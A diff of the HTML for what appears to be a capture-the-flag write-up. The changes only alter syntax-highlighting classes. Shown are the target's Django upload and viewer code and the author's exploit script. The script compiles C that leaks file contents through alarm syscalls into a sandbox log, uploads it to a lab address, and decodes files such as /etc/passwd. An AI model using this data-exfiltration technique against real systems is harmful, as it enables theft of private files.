@@ -1115,40 +1115,40 @@ The archive looks interesting so let’s download and unpack it.</p>
 33
 34
 35
-</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span><span class="p">,</span> <span class="n">HttpResponseRedirect</span>
-<span class="kn">from</span> <span class="nn">django.shortcuts</span> <span class="kn">import</span> <span class="n">render</span>
-<span class="kn">from</span> <span class="nn">django.conf</span> <span class="kn">import</span> <span class="n">settings</span>
-<span class="kn">from</span> <span class="nn">django_file_md5</span> <span class="kn">import</span> <span class="n">calculate_file_md5</span>
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">django.http</span> <span class="kn">import</span> <span class="n">HttpResponse</span><span class="p">,</span> <span class="n">HttpResponseRedirect</span>
+<span class="kn">from</span> <span class="n">django.shortcuts</span> <span class="kn">import</span> <span class="n">render</span>
+<span class="kn">from</span> <span class="n">django.conf</span> <span class="kn">import</span> <span class="n">settings</span>
+<span class="kn">from</span> <span class="n">django_file_md5</span> <span class="kn">import</span> <span class="n">calculate_file_md5</span>
 
-<span class="kn">from</span> <span class="nn">.forms</span> <span class="kn">import</span> <span class="n">UploadFileForm</span>
+<span class="kn">from</span> <span class="n">.forms</span> <span class="kn">import</span> <span class="n">UploadFileForm</span>
 
-<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="n">os</span>
 
 
 <span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
-    <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s">"Hello, world. You're at the polls index."</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="s">"Hello, world. You're at the polls index."</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">upload_file</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
     <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">'POST'</span><span class="p">:</span>
-        <span class="n">form</span> <span class="o">=</span> <span class="n">UploadFileForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">POST</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">FILES</span><span class="p">)</span>
-        <span class="k">if</span> <span class="n">form</span><span class="p">.</span><span class="n">is_valid</span><span class="p">():</span>
-            <span class="n">md5</span> <span class="o">=</span> <span class="n">handle_file</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">FILES</span><span class="p">[</span><span class="s">'file'</span><span class="p">])</span>
-            <span class="k">return</span> <span class="n">HttpResponseRedirect</span><span class="p">(</span><span class="sa">f</span><span class="s">'/viewer/</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+        <span class="n">form</span> <span class="o">=</span> <span class="nc">UploadFileForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">POST</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">FILES</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">form</span><span class="p">.</span><span class="nf">is_valid</span><span class="p">():</span>
+            <span class="n">md5</span> <span class="o">=</span> <span class="nf">handle_file</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">FILES</span><span class="p">[</span><span class="s">'file'</span><span class="p">])</span>
+            <span class="k">return</span> <span class="nc">HttpResponseRedirect</span><span class="p">(</span><span class="sa">f</span><span class="s">'/viewer/</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
         <span class="k">else</span><span class="p">:</span>
-            <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s">"Invalid form"</span><span class="p">)</span>
+            <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="s">"Invalid form"</span><span class="p">)</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="k">return</span> <span class="n">render</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="s">'upload.html'</span><span class="p">,</span> <span class="p">{</span><span class="s">'form'</span><span class="p">:</span> <span class="n">UploadFileForm</span><span class="p">()})</span>
+        <span class="k">return</span> <span class="nf">render</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="s">'upload.html'</span><span class="p">,</span> <span class="p">{</span><span class="s">'form'</span><span class="p">:</span> <span class="nc">UploadFileForm</span><span class="p">()})</span>
 
 
 <span class="k">def</span> <span class="nf">handle_file</span><span class="p">(</span><span class="nb">file</span><span class="p">):</span>
-    <span class="n">md5</span> <span class="o">=</span> <span class="n">calculate_file_md5</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
+    <span class="n">md5</span> <span class="o">=</span> <span class="nf">calculate_file_md5</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>
     <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">settings</span><span class="p">.</span><span class="n">FILE_PATH</span><span class="si">}</span><span class="s">/</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">"</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">'wb+'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="n">chunks</span><span class="p">():</span>
-            <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
-    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">"cd </span><span class="si">{</span><span class="n">settings</span><span class="p">.</span><span class="n">SBX_PATH</span><span class="si">}</span><span class="s">; ./sandbox </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
-    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">'wb+'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="nb">file</span><span class="p">.</span><span class="nf">chunks</span><span class="p">():</span>
+            <span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="s">"cd </span><span class="si">{</span><span class="n">settings</span><span class="p">.</span><span class="n">SBX_PATH</span><span class="si">}</span><span class="s">; ./sandbox </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="nf">remove</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">md5</span>
 </pre></td></tr></tbody></table></code></div></div>
 
@@ -1194,41 +1194,41 @@ The archive looks interesting so let’s download and unpack it.</p>
 34
 35
 36
-</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">django.shortcuts</span> <span class="kn">import</span> <span class="n">render</span>
-<span class="kn">from</span> <span class="nn">django.conf</span> <span class="kn">import</span> <span class="n">settings</span>
-<span class="kn">from</span> <span class="nn">django.http</span> <span class="kn">import</span> <span class="n">Http404</span><span class="p">,</span> <span class="n">HttpResponse</span>
-<span class="kn">from</span> <span class="nn">.syscalls</span> <span class="kn">import</span> <span class="n">LoggedSyscall</span><span class="p">,</span> <span class="n">SyscallClass</span>
+</pre></td><td class="rouge-code"><pre><span class="kn">from</span> <span class="n">django.shortcuts</span> <span class="kn">import</span> <span class="n">render</span>
+<span class="kn">from</span> <span class="n">django.conf</span> <span class="kn">import</span> <span class="n">settings</span>
+<span class="kn">from</span> <span class="n">django.http</span> <span class="kn">import</span> <span class="n">Http404</span><span class="p">,</span> <span class="n">HttpResponse</span>
+<span class="kn">from</span> <span class="n">.syscalls</span> <span class="kn">import</span> <span class="n">LoggedSyscall</span><span class="p">,</span> <span class="n">SyscallClass</span>
 
-<span class="kn">import</span> <span class="nn">os.path</span>
-<span class="kn">import</span> <span class="nn">struct</span>
+<span class="kn">import</span> <span class="n">os.path</span>
+<span class="kn">import</span> <span class="n">struct</span>
 
 
 <span class="k">def</span> <span class="nf">view_file</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">md5</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
     <span class="n">path</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">settings</span><span class="p">.</span><span class="n">SBX_PATH</span><span class="si">}</span><span class="s">/jails/</span><span class="si">{</span><span class="n">md5</span><span class="si">}</span><span class="s">"</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
-        <span class="k">raise</span> <span class="n">Http404</span><span class="p">(</span><span class="s">"A sample with this hash has not been uploaded."</span><span class="p">)</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+        <span class="k">raise</span> <span class="nc">Http404</span><span class="p">(</span><span class="s">"A sample with this hash has not been uploaded."</span><span class="p">)</span>
     <span class="n">logfile</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s">/log"</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">logfile</span><span class="p">):</span>
-        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s">"There was an error logging this application"</span><span class="p">)</span>
-    <span class="n">syscalls</span> <span class="o">=</span> <span class="p">[</span><span class="n">call</span><span class="p">.</span><span class="n">render</span><span class="p">()</span> <span class="k">for</span> <span class="n">call</span> <span class="ow">in</span> <span class="n">parse_log</span><span class="p">(</span><span class="n">logfile</span><span class="p">)]</span>
-    <span class="n">ignore</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">Ignore</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
-    <span class="n">low</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">Low</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
-    <span class="n">med</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
-    <span class="n">high</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">exists</span><span class="p">(</span><span class="n">logfile</span><span class="p">):</span>
+        <span class="k">return</span> <span class="nc">HttpResponse</span><span class="p">(</span><span class="s">"There was an error logging this application"</span><span class="p">)</span>
+    <span class="n">syscalls</span> <span class="o">=</span> <span class="p">[</span><span class="n">call</span><span class="p">.</span><span class="nf">render</span><span class="p">()</span> <span class="k">for</span> <span class="n">call</span> <span class="ow">in</span> <span class="nf">parse_log</span><span class="p">(</span><span class="n">logfile</span><span class="p">)]</span>
+    <span class="n">ignore</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">Ignore</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
+    <span class="n">low</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">Low</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
+    <span class="n">med</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
+    <span class="n">high</span> <span class="o">=</span> <span class="nf">list</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="k">lambda</span> <span class="n">call</span><span class="p">:</span> <span class="n">call</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="n">syscalls</span><span class="p">))</span>
     <span class="n">render_vars</span> <span class="o">=</span> <span class="p">{</span><span class="s">"md5"</span><span class="p">:</span> <span class="n">md5</span><span class="p">,</span> <span class="s">"ignore"</span><span class="p">:</span> <span class="n">ignore</span><span class="p">,</span> <span class="s">"low"</span><span class="p">:</span> <span class="n">low</span><span class="p">,</span> <span class="s">"med"</span><span class="p">:</span> <span class="n">med</span><span class="p">,</span> <span class="s">"high"</span><span class="p">:</span> <span class="n">high</span><span class="p">}</span>
-    <span class="k">return</span> <span class="n">render</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="s">'view.html'</span><span class="p">,</span> <span class="n">render_vars</span><span class="p">)</span>
+    <span class="k">return</span> <span class="nf">render</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="s">'view.html'</span><span class="p">,</span> <span class="n">render_vars</span><span class="p">)</span>
 
 
 <span class="k">def</span> <span class="nf">parse_log</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
     <span class="n">syscalls</span> <span class="o">=</span> <span class="p">[]</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-        <span class="n">chunk</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
-        <span class="n">nums</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"q"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">chunk</span><span class="p">)</span>
-        <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span><span class="o">*</span><span class="mi">8</span><span class="p">:</span>
-            <span class="n">nums</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">"q"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">chunk</span><span class="p">)</span>
-            <span class="n">call</span> <span class="o">=</span> <span class="n">LoggedSyscall</span><span class="p">(</span><span class="n">nums</span><span class="p">)</span>
-            <span class="n">syscalls</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">call</span><span class="p">)</span>
-            <span class="n">chunk</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
+    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">chunk</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
+        <span class="n">nums</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s">"q"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">chunk</span><span class="p">)</span>
+        <span class="k">while</span> <span class="nf">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span><span class="o">*</span><span class="mi">8</span><span class="p">:</span>
+            <span class="n">nums</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">unpack</span><span class="p">(</span><span class="s">"q"</span> <span class="o">*</span> <span class="mi">8</span><span class="p">,</span> <span class="n">chunk</span><span class="p">)</span>
+            <span class="n">call</span> <span class="o">=</span> <span class="nc">LoggedSyscall</span><span class="p">(</span><span class="n">nums</span><span class="p">)</span>
+            <span class="n">syscalls</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">call</span><span class="p">)</span>
+            <span class="n">chunk</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">syscalls</span>
 </pre></td></tr></tbody></table></code></div></div>
 <p><code class="language-plaintext highlighter-rouge">malscanner/viewer/syscalls.py</code></p>
@@ -2148,11 +2148,11 @@ toor
 54
 55
 56
-</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
-<span class="kn">import</span> <span class="nn">uuid</span>
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-<span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
+</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
+<span class="kn">import</span> <span class="n">uuid</span>
+<span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">sys</span>
+<span class="kn">from</span> <span class="n">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>
 
 <span class="n">FILENAME</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
 <span class="n">URL</span> <span class="o">=</span> <span class="s">'http://10.129.159.163/scanner/upload/'</span>
@@ -2169,41 +2169,41 @@ int main (int argc, char *argv[])
   <span class="si">{</span>
     <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
     <span class="n">val</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">unsigned</span> <span class="nb">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
-    <span class="n">syscall</span><span class="p">(</span><span class="mi">37</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+    <span class="nf">syscall</span><span class="p">(</span><span class="mi">37</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
   <span class="si">}</span>
-  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+  <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="si">}</span><span class="s">
 '''</span>
 
-<span class="n">guid_source</span> <span class="o">=</span> <span class="n">uuid</span><span class="p">.</span><span class="n">uuid4</span><span class="p">()</span>
-<span class="n">guid_bin</span> <span class="o">=</span> <span class="n">uuid</span><span class="p">.</span><span class="n">uuid4</span><span class="p">()</span>
+<span class="n">guid_source</span> <span class="o">=</span> <span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span>
+<span class="n">guid_bin</span> <span class="o">=</span> <span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span>
 
-<span class="n">source</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s">'./</span><span class="si">{</span><span class="n">guid_source</span><span class="si">}</span><span class="s">.c'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
-<span class="n">source</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">C_CODE</span><span class="p">)</span>
-<span class="n">source</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">source</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="s">'./</span><span class="si">{</span><span class="n">guid_source</span><span class="si">}</span><span class="s">.c'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
+<span class="n">source</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">C_CODE</span><span class="p">)</span>
+<span class="n">source</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 
-<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'gcc ./</span><span class="si">{</span><span class="n">guid_source</span><span class="si">}</span><span class="s">.c -o </span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'gcc ./</span><span class="si">{</span><span class="n">guid_source</span><span class="si">}</span><span class="s">.c -o </span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
 
 <span class="n">multipart_form_data</span> <span class="o">=</span> <span class="p">{</span>
-    <span class="s">'file'</span><span class="p">:</span> <span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s">'./</span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)),</span>
+    <span class="s">'file'</span><span class="p">:</span> <span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="s">'./</span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)),</span>
 <span class="p">}</span>
 
-<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">multipart_form_data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'rm ./</span><span class="si">{</span><span class="n">guid_source</span><span class="si">}</span><span class="s">.c </span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">multipart_form_data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'rm ./</span><span class="si">{</span><span class="n">guid_source</span><span class="si">}</span><span class="s">.c </span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
 
 
 <span class="n">out</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
 
-<span class="n">valid_lines</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="k">if</span> <span class="s">'alarm(0x'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">]</span>
+<span class="n">valid_lines</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="k">if</span> <span class="s">'alarm(0x'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">]</span>
 <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">valid_lines</span><span class="p">:</span>
-    <span class="n">exfil</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">'alarm(0x'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">') = 0x'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
-    <span class="n">exfil</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">exfil</span><span class="p">))</span> <span class="o">+</span> <span class="n">exfil</span>
-    <span class="n">out</span> <span class="o">+=</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">exfil</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">exfil</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s">'alarm(0x'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="s">') = 0x'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">exfil</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">exfil</span><span class="p">))</span> <span class="o">+</span> <span class="n">exfil</span>
+    <span class="n">out</span> <span class="o">+=</span> <span class="nf">unhexlify</span><span class="p">(</span><span class="n">exfil</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
 
-<span class="n">save_out</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">FILENAME</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="s">'_'</span><span class="p">),</span> <span class="s">'wb'</span><span class="p">)</span>
-<span class="n">save_out</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
-<span class="n">save_out</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">save_out</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">FILENAME</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="s">'_'</span><span class="p">),</span> <span class="s">'wb'</span><span class="p">)</span>
+<span class="n">save_out</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+<span class="n">save_out</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </pre></td></tr></tbody></table></code></div></div>
 
 <p>Testing it with the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file again we can now comfortably retrieve it.</p>
@@ -3013,6 +3013,493 @@ bash-5.1# wc -c /root/root.txt
     
     
     
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+        
+        
+
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+      
+    
+  
+    
+    
+    
+    
+  
+    
+    
